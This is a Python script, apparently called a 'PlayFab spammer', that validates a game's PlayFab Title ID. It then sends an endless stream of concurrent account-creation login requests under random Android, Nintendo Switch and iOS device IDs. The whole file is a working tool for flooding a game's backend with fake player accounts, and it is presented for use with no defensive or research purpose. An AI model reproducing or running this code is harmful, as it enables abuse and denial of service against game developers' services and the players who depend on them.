import os
import aiohttp
import asyncio
import json
import uuid
import concurrent.futures
from colorama import init, Fore, Style
import time

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.BLUE + '''                                             
                        __      _______ _____  ______ _____   __      _____  
                        \ \    / /_   _|  __ \|  ____|  __ \  \ \    / /__ \ 
                         \ \  / /  | | | |__) | |__  | |__) |  \ \  / /   ) |
                          \ \/ /   | | |  ___/|  __| |  _  /    \ \/ /   / / 
                           \  /   _| |_| |    | |____| | \ \     \  /   / /_ 
                            \/   |_____|_|    |______|_|  \_\     \/   |____|
                                                                           
                           ᴾˡᵃʸᶠᵃᵇ ˢᵖᵃᵐᵐᵉʳ                              V1.0                                                      
    ''')

init(autoreset=True)

async def loginPlayfabAccount(session, url, payload, accountType, deviceId):
    async with session.post(url, json=payload) as response:
        print(f"Sent {accountType}: {deviceId}")
        return response.status

async def verifyTitleId(titleId):
    async with aiohttp.ClientSession() as session:
        custom_id = str(uuid.uuid4())

        payload = {
            "TitleId": titleId,
            "CustomId": custom_id,
            "CreateAccount": True,
            "InfoRequestParameters": {
                "GetUserAccountInfo": True
            }
        }

        url = f"https://{titleId}.playfabapi.com/Client/LoginWithCustomID"

        async with session.post(url, json=payload) as response:
            if response.status == 200:
                return True
            else:
                return False

def getAccountTypeInfo(titleId, deviceId):
    accountInfo = {
        "android": {
            "url":
            f"https://{titleId}.playfabapi.com/Client/LoginWithAndroidDeviceID",
            "payload": {
                "TitleId": titleId,
                "AndroidDeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {
                    "GetUserAccountInfo": True
                }
            }
        },
        "nintendo": {
            "url":
            f"https://{titleId}.playfabapi.com/Client/LoginWithNintendoSwitchDeviceID",
            "payload": {
                "TitleId": titleId,
                "NintendoSwitchDeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {
                    "GetUserAccountInfo": True
                }
            }
        },
        "ios": {
            "url":
            f"https://{titleId}.playfabapi.com/Client/LoginWithIOSDeviceID",
            "payload": {
                "TitleId": titleId,
                "DeviceId": deviceId,
                "CreateAccount": True,
                "InfoRequestParameters": {
                    "GetUserAccountInfo": True
                }
            }
        }
    }
    return [(accountType, info["url"], info["payload"]) for accountType, info in accountInfo.items()]

async def main():
    print_banner()
    titleId = input(Fore.RED + "Title ID: " + Style.RESET_ALL)

    while True:
        is_valid = await verifyTitleId(titleId)
        if is_valid:
            async with aiohttp.ClientSession() as session:
                with concurrent.futures.ThreadPoolExecutor(200) as executor:
                    loop = asyncio.get_event_loop()
                    while True:
                        deviceId = str(uuid.uuid4())
                        tasks = [
                            loop.create_task(
                                loginPlayfabAccount(session, url, payload, accountType, deviceId))
                            for accountType, url, payload in getAccountTypeInfo(titleId, deviceId)
                        ]
                        await asyncio.gather(*tasks)
                        await asyncio.sleep(0)
            break
        else:
            print(Fore.YELLOW + "Invalid Title ID. Please enter a valid Title ID.")
            time.sleep(2)
            print_banner()
            titleId = input(Fore.RED + "Title ID: " + Style.RESET_ALL)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
